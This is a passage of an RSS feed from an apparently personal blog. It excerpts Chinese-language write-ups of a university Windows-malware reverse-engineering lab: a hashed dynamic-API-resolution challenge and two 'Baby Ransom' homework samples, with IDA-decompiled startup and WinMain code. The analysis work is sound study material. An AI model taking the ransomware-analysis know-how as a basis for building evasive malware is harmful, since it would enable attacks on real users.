Shellcode 沒有 loader 幫你把 API 連結起來&lt;/p></description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</guid><description>&lt;h1 id="simple-reverse---0x252023-lab---winmalware---作業">
 Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)
 &lt;a class="anchor" href="#simple-reverse---0x252023-lab---winmalware---%e4%bd%9c%e6%a5%ad">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？
&lt;a href="https://github.com/Mr-Un1k0d3r/WindowsDllsExport/blob/main/Win11-22000/user32.dll.txt">A list of all exported functions of user32.dll&lt;/a>&lt;/p>
&lt;p>Flag format: FLAG{WindowsAPIname}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/Bkd51XRM6">Dynamic API Resolution Background&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道&lt;code>__ROL4__&lt;/code>的意思，根據&lt;a href="https://www.felixcloutier.com/x86/rcl:rcr:rol:ror">x86 and amd64 instruction reference&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.&lt;/p></description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</guid><description>&lt;h1 id="simple-reverse-0x302023-hw---baby-ransom-1">
 Simple Reverse 0x30(2023 HW - Baby Ransom 1)
 &lt;a class="anchor" href="#simple-reverse-0x302023-hw---baby-ransom-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesw">SetFileAttributesW 函式&lt;/a>
&lt;a href="http://stenwang.blogspot.com/2015/09/schtasks.html">Schtasks 工作排程 &lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-findresourcea">FindResourceA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 StackBase = NtCurrentTeb()-&amp;gt;NtTib.StackBase;
 while ( 1 )
 {
 DestInitValue = _InterlockedCompareExchange64(&amp;amp;qword_140017050, StackBase, 0i64);
 if ( !DestInitValue )
 {
 v5 = 0;
 goto LABEL_7;
 }
 if ( StackBase == DestInitValue )
 break;
 Sleep(1000u);
 }
 v5 = 1;
LABEL_7:
 if ( unk_140017058 == 1 )
 {
 amsg_exit(31i64);
 }
 else if ( unk_140017058 )
 {
 dword_140017008 = 1;
 }
 else
 {
 unk_140017058 = 1;
 initterm(&amp;amp;qword_140019018, qword_140019028);
 }
 if ( unk_140017058 == 1 )
 {
 initterm(&amp;amp;qword_140019000, &amp;amp;qword_140019010);
 unk_140017058 = 2;
 }
 if ( !v5 )
 _InterlockedExchange64(&amp;amp;qword_140017050, 0i64);
 if ( TlsCallback_0 )
 TlsCallback_0(0i64, 2);
 sub_14000226B();
 v6 = 0i64;
 qword_1400170E0 = SetUnhandledExceptionFilter(&amp;amp;loc_140002530);
 (InterlockedExchange64)(nullsub_1);
 InitFloatUnit();
 v7 = dword_140017028;
 space = malloc(8i64 * (dword_140017028 + 1));
 v9 = qword_140017020;
 space_cp = space;
 while ( v7 &amp;gt; v6 )
 {
 size = strlen(*(v9 + 8 * v6)) + 1;
 dest = malloc(size);
 *(space_cp + 8 * v6) = dest;
 src = *(v9 + 8 * v6++);
 qmemcpy(dest, src, size);
 }
 qword_140017020 = space_cp;
 if ( v7 &amp;lt; 0 )
 v7 = 0i64;
 *(space_cp + 8 * v7) = 0i64;
 sub_140001F1E();
 _initenv = qword_140017018;
 dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 =&amp;gt; 0x254CA9C1580
 if ( !dword_14001700C )
 exit(dword_140017010);
 if ( !dword_140017008 )
 cexit();
 return dword_140017010;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA NetworkConfig_1DBB&lt;/p></description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</guid><description>&lt;h1 id="simple-reverse-0x312023-hw---baby-ransom-2">
 Simple Reverse 0x31(2023 HW - Baby Ransom 2)
 &lt;a class="anchor" href="#simple-reverse-0x312023-hw---baby-ransom-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://forum.butian.net/share/2204">SystemFunction033&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA WinMain&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
 HWND hWnd; // [rsp+60h] [rbp-A8h]
 WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
 struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

 memset(&amp;amp;WndClass, 0, sizeof(WndClass));
 WndClass.lpfnWndProc = (WNDPROC)store_winword;
 WndClass.hInstance = hInstance;
 WndClass.lpszClassName = Caption;
 WndClass.hbrBackground = CreateSolidBrush(0);
 if ( !RegisterClassW(&amp;amp;WndClass) )
 return 1;
 hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
 if ( !hWnd )
 return 2;
 MainPayload();
 ShowWindow(hWnd, nShowCmd);
 memset(&amp;amp;Msg, 0, sizeof(Msg));
 while ( GetMessageW(&amp;amp;Msg, 0i64, 0, 0) )
 {
 TranslateMessage(&amp;amp;Msg);
 DispatchMessageW(&amp;amp;Msg);
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA MainPayload&lt;/p></description></item></channel></rss>